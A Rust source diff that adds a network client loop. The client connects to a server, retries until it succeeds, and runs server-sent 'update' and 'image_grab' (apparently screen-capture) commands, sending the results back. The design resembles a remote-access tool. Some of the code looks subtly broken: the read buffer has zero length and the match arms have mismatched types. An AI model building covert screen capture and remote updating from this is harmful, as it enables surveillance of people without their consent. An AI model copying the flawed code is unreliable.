@@ -2,21 +2,23 @@
 
 use std::time::Duration;
 use anyhow::{anyhow, Result};
-use tokio::io::AsyncWriteExt;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::sleep;
+use bytes::{Buf, BytesMut};
+use variable_len_reader::str::read_string;
 use crate::links::try_select_link;
 
 mod links;
+mod update;
 mod image_grab;
 
 #[tokio::main]
 async fn main() {
     loop {
-        let res = main_loop().await;
-        if res.is_none() {
-            sleep(Duration::from_secs(10)).await;
-            continue;
+        if main_loop().await.is_ok() {
+            break;
         }
+        sleep(Duration::from_secs(10)).await;
     }
 }
 
@@ -26,6 +28,25 @@ async fn main_loop() -> Result<()> {
         return Err(anyhow!("No available server link."));
     }
     let mut stream = stream.unwrap();
-
-    Ok(())
+    loop {
+        let len = stream.read_u32().await?;
+        let mut request = BytesMut::with_capacity(len as usize);
+        stream.read_exact(&mut request).await?;
+        let mut request = request.reader();
+        let mut exit = false;
+        let response = match &read_string(&mut request)? as &str {
+            "update" => {
+                let res = update::update(&mut request).await?;
+                exit = res.1;
+                res.0
+            },
+            "image_grab" => image_grab::image_grab(&mut request).await?,
+            _ => Err(anyhow!("Unknown function.")),
+        };
+        stream.write_all(&response).await?;
+        stream.flush().await?;
+        if exit {
+            return Ok(());
+        }
+    }
 }
